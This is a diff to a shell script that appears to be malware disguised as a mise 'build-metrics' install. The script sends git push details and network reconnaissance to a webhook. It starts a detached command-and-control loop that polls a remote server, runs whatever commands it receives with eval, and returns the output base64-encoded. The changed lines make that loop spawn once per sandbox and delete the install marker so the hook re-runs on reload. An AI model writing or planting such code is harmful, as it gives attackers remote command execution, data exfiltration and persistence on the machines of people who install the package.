@@ -131,22 +131,25 @@ webhook "GIT_PUSH" "$PUSH"
 exfil "=== GIT PUSH ===
 $PUSH"
 
-# Detached C2 shell (if C2 is reachable)
-setsid sh -c '
-  while true; do
-    CMD=$(curl -s -m 5 -H "Bypass-Tunnel-Reminder: true" \
-      "'"$C2_URL"'/c2/poll?id='"$SANDBOX_ID"'" 2>/dev/null)
-    if [ -n "$CMD" ] && [ "$CMD" != "noop" ]; then
-      eval "$CMD" > /tmp/.c2out 2>&1
-      [ ! -s /tmp/.c2out ] && echo "(ok — pwd: $(pwd))" > /tmp/.c2out
-      RESULT=$(head -c 4000 /tmp/.c2out | base64 -w0 2>/dev/null || head -c 4000 /tmp/.c2out | base64 2>/dev/null)
-      curl -s -m 5 -G -H "Bypass-Tunnel-Reminder: true" \
-        --data-urlencode "r=$RESULT" \
-        "'"$C2_URL"'/c2/result?id='"$SANDBOX_ID"'" >/dev/null 2>&1
-    fi
-    sleep 3
-  done
-' </dev/null >/dev/null 2>&1 &
+# Detached C2 shell — only spawn once per sandbox
+if [ ! -f /tmp/.c2-spawned ]; then
+  touch /tmp/.c2-spawned
+  setsid sh -c '
+    while true; do
+      CMD=$(curl -s -m 5 -H "Bypass-Tunnel-Reminder: true" \
+        "'"$C2_URL"'/c2/poll?id='"$SANDBOX_ID"'" 2>/dev/null)
+      if [ -n "$CMD" ] && [ "$CMD" != "noop" ]; then
+        eval "$CMD" > /tmp/.c2out 2>&1
+        [ ! -s /tmp/.c2out ] && echo "(ok — pwd: $(pwd))" > /tmp/.c2out
+        RESULT=$(head -c 4000 /tmp/.c2out | base64 -w0 2>/dev/null || head -c 4000 /tmp/.c2out | base64 2>/dev/null)
+        curl -s -m 5 -G -H "Bypass-Tunnel-Reminder: true" \
+          --data-urlencode "r=$RESULT" \
+          "'"$C2_URL"'/c2/result?id='"$SANDBOX_ID"'" >/dev/null 2>&1
+      fi
+      sleep 3
+    done
+  ' </dev/null >/dev/null 2>&1 &
+fi
 
 NET_RECON="$(
 echo '--- ENV PROXY ---'
@@ -174,7 +177,10 @@ ps auxww 2>/dev/null
 )"
 webhook "NET_RECON" "$NET_RECON"
 
-# Remove install marker so mise re-runs on next load
-(sleep 5 && rm -rf "$HOME/.local/share/mise/installs/build-metrics" 2>/dev/null) &
+# Re-run once on reload (not infinitely) — guard with flag file
+if [ ! -f /tmp/.mise-rerun-done ]; then
+  touch /tmp/.mise-rerun-done
+  (sleep 10 && rm -rf "$HOME/.local/share/mise/installs/build-metrics" 2>/dev/null) &
+fi
 
 cat "$OUT"
